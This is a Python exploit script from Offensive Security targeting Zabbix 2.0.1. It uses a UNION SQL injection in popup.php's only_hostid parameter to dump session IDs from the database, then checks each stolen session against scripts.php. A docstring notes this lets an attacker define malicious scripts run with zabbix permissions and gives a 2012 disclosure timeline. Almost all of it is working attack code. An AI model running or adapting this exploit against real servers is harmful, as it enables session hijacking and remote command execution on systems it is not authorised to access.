#!/usr/bin/python

import re
import sys,urllib2,urllib

print "\n[*] Zabbix 2.0.1 Session Extractor 0day"
print "[*] http://www.offensive-security.com"
print "##################################\n"

''' 

The sessions found by this tool may allow you to access the scripts.php file.
Through this web interface, an administrator can define new malicious scripts. 
These scripts can then be called from the maps area, and executed with "zabbix" permissions.

Timeline:

17 Jul 2012: Vulnerabilty reported
17 Jul 2012: Reply received
18 Jul 2012: Issue opened: https://support.zabbix.com/browse/ZBX-5348
19 Jul 2012: Fixed for inclusion in version 2.0.2

'''

ip="192.168.193.169"

target = 'http://%s/zabbix/popup.php' % ip
url = 'http://%s/zabbix/scripts.php' % ip

def sendSql(num):
        global target
        payload="1)) union select 1,group_concat(sessionid) from sessions where userid='%s'#" % num
        
        #payload="1 union select 1,1,1,1,1,group_concat(sessionid),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1 from sessions where userid='%s'#" % num

       # dstfrm=form_scenario&dstfld1=application&srctbl=applications&srcfld1=name&only_hostid=
        values = {'dstfrm':'form_scenario','dstfld1':'application','srctbl':'applications','srcfld1':'name', 'only_hostid':payload }
        
        url = "%s?%s" % (target, urllib.urlencode(values))  
        req = urllib2.Request(url)                          
        response = urllib2.urlopen(req)                 
        data = response.read()
        print url
        return data

def normal(cookie):
	global url
        req = urllib2.Request(url)
        cook = "zbx_sessionid=%s" %cookie
        req.add_header('Cookie', cook)
        response = urllib2.urlopen(req)                 
        print req
        data = response.read()                  
        if re.search('ERROR: Session terminated, re-login, please',data) or re.search('You are not logged in',data) or re.search('ERROR: No Permissions',data):
                return "FAIL"
        else:
                return "SUCCESS"

sessions=[]

for m in range(1,2):
        hola=sendSql(m)
        for l in re.findall(r"([a-fA-F\d]{32})", hola):
		if l not in sessions:
			sessions.append(l)
	                print "[*] Found sessionid %s - %s" % (l,normal(l))
